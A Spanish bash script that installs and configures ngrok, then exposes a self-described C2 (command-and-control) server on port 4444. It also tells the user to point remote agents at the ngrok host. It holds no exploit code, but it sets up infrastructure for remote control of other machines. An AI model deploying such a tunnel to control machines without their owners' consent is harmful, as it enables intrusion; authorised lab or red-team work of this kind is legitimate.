#!/bin/bash

echo "=========================================="
echo "  SETUP COMPLETO DE NGROK"
echo "=========================================="
echo ""

# Paso 1: Verificar si ngrok está instalado
echo "Paso 1: Verificando instalación de ngrok..."
if command -v ngrok &> /dev/null; then
    echo "✅ ngrok está instalado"
    ngrok version
else
    echo "❌ ngrok NO está instalado"
    echo ""
    echo "¿Quieres instalarlo ahora?"
    echo "1) Sí, con snap (recomendado)"
    echo "2) No, lo haré manualmente"
    read -p "Selecciona [1/2]: " opcion
    
    if [ "$opcion" = "1" ]; then
        echo ""
        echo "Instalando ngrok con snap..."
        sudo snap install ngrok
        if [ $? -eq 0 ]; then
            echo "✅ ngrok instalado correctamente"
        else
            echo "❌ Error al instalar ngrok"
            exit 1
        fi
    else
        echo ""
        echo "Instala ngrok manualmente desde: https://ngrok.com/download"
        echo "O ejecuta: sudo snap install ngrok"
        exit 1
    fi
fi

echo ""
echo "=========================================="

# Paso 2: Verificar si ya está configurado el authtoken
echo "Paso 2: Verificando authtoken..."
echo ""

if [ -f "$HOME/.config/ngrok/ngrok.yml" ] || [ -f "$HOME/.ngrok2/ngrok.yml" ]; then
    echo "✅ Archivo de configuración de ngrok encontrado"
    echo ""
    read -p "¿Quieres reconfigurar el authtoken? (s/n): " reconfig
    
    if [ "$reconfig" != "s" ]; then
        echo "✅ Usando configuración existente"
        echo ""
        echo "=========================================="
        echo "  ¡LISTO PARA USAR!"
        echo "=========================================="
        echo ""
        echo "Ahora puedes ejecutar:"
        echo "  ngrok tcp 4444"
        echo ""
        exit 0
    fi
fi

echo ""
echo "Necesitas configurar tu authtoken de ngrok"
echo ""
echo "PASOS:"
echo "1. Ve a: https://dashboard.ngrok.com/get-started/your-authtoken"
echo "   (Si no tienes cuenta, créala gratis en https://ngrok.com/signup)"
echo ""
echo "2. Copia tu authtoken (se ve así: 2hXXXXXXXXXXXXXXXXXXX...)"
echo ""
read -p "3. Pégalo aquí: " authtoken

if [ -z "$authtoken" ]; then
    echo ""
    echo "❌ No ingresaste ningún token"
    exit 1
fi

echo ""
echo "Configurando authtoken..."
ngrok config add-authtoken "$authtoken"

if [ $? -eq 0 ]; then
    echo ""
    echo "✅ Authtoken configurado correctamente"
else
    echo ""
    echo "❌ Error al configurar authtoken"
    exit 1
fi

echo ""
echo "=========================================="
echo "  ✅ SETUP COMPLETO"
echo "=========================================="
echo ""
echo "Ahora puedes usar ngrok:"
echo ""
echo "1. Inicia tu servidor C2:"
echo "   cd server"
echo "   python3 server.py"
echo ""
echo "2. En otra terminal, crea el túnel:"
echo "   ngrok tcp 4444"
echo ""
echo "3. Copia la URL que aparece en 'Forwarding'"
echo "   Ejemplo: tcp://0.tcp.ngrok.io:12345"
echo ""
echo "4. Usa esa URL en los agentes:"
echo "   python3 agent_ngrok.py 0.tcp.ngrok.io 12345"
echo ""
echo "=========================================="
echo ""
read -p "¿Quieres iniciar ngrok ahora? (s/n): " start_now

if [ "$start_now" = "s" ]; then
    echo ""
    echo "Verificando si el servidor está corriendo en puerto 4444..."
    if ss -tlnp 2>/dev/null | grep -q ":4444"; then
        echo "✅ Servidor detectado en puerto 4444"
        echo ""
        echo "Iniciando ngrok..."
        echo ""
        ngrok tcp 4444
    else
        echo "⚠️  No hay servidor corriendo en puerto 4444"
        echo ""
        echo "Debes iniciar el servidor primero:"
        echo "  cd server"
        echo "  python3 server.py"
        echo ""
        echo "Luego ejecuta:"
        echo "  ngrok tcp 4444"
    fi
fi
